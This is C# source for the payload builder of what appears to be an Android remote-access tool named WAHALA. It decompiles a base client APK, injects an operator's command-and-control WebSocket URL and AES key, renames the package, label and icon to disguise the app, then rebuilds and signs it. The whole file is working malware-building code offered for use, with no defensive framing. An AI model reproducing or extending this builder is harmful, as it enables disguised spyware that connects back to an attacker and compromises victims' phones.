using System;
using System.IO;

namespace WAHALA.Server.Core
{
    public class AndroidBuilder
    {
        public static void Build(string outputApkPath, string c2Url, string aesKeyBase64, string appName, string packageName, string iconPath = null)
        {
            string tempDir = Path.Combine(Path.GetTempPath(), "wahala_apk_build_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(tempDir);

            // Path to the pre-built APK from wave 3 (or source)
            string baseApk = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientSource", "WAHALA_Base.apk");
            if (!File.Exists(baseApk))
                throw new FileNotFoundException("Base APK not found. Compile wave 3 and place as 'WAHALA_Base.apk' in ClientSource.");

            // Decode with apktool
            string apkDir = Path.Combine(tempDir, "decoded");
            ProcessRunner.Run("apktool", $"d -f \"{baseApk}\" -o \"{apkDir}\"");

            // Patch ServiceCore.java (or smali) with C2 URL and AES key
            string serviceCorePath = Path.Combine(apkDir, "smali", "com", "wahala", "client", "ServiceCore.smali");
            if (File.Exists(serviceCorePath))
            {
                string smali = File.ReadAllText(serviceCorePath);
                smali = smali.Replace("ws://YOUR_SERVER_IP:4444", c2Url);
                smali = smali.Replace("YOUR_BASE64_KEY", aesKeyBase64);
                File.WriteAllText(serviceCorePath, smali);
            }

            // Patch AndroidManifest.xml (app name, package name)
            string manifestPath = Path.Combine(apkDir, "AndroidManifest.xml");
            string manifest = File.ReadAllText(manifestPath);
            manifest = manifest.Replace("package=\"com.wahala.client\"", $"package=\"{packageName}\"");
            manifest = manifest.Replace("android:label=\"@string/app_name\"", $"android:label=\"{appName}\"");
            File.WriteAllText(manifestPath, manifest);

            // Patch strings.xml for app name
            string stringsPath = Path.Combine(apkDir, "res", "values", "strings.xml");
            if (File.Exists(stringsPath))
            {
                string strings = File.ReadAllText(stringsPath);
                strings = strings.Replace("<string name=\"app_name\">WAHALA</string>", $"<string name=\"app_name\">{appName}</string>");
                File.WriteAllText(stringsPath, strings);
            }

            // Replace icon if provided
            if (iconPath != null && File.Exists(iconPath))
            {
                string iconDest = Path.Combine(apkDir, "res", "mipmap-xxxhdpi", "ic_launcher.png");
                File.Copy(iconPath, iconDest, true);
            }

            // Rebuild APK
            string unsignedApk = Path.Combine(tempDir, "unsigned.apk");
            ProcessRunner.Run("apktool", $"b \"{apkDir}\" -o \"{unsignedApk}\"");

            // Sign with jarsigner (requires a keystore; we generate a temporary one)
            string keystorePath = Path.Combine(tempDir, "temp.keystore");
            ProcessRunner.Run("keytool", "-genkeypair -v -keystore \"" + keystorePath + "\" -alias wahala -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname \"CN=WAHALA\"");
            ProcessRunner.Run("jarsigner", "-sigalg SHA1withRSA -digestalg SHA1 -keystore \"" + keystorePath + "\" -storepass password -keypass password \"" + unsignedApk + "\" wahala");

            File.Copy(unsignedApk, outputApkPath, true);

            // Cleanup
            Directory.Delete(tempDir, true);
        }
    }
}
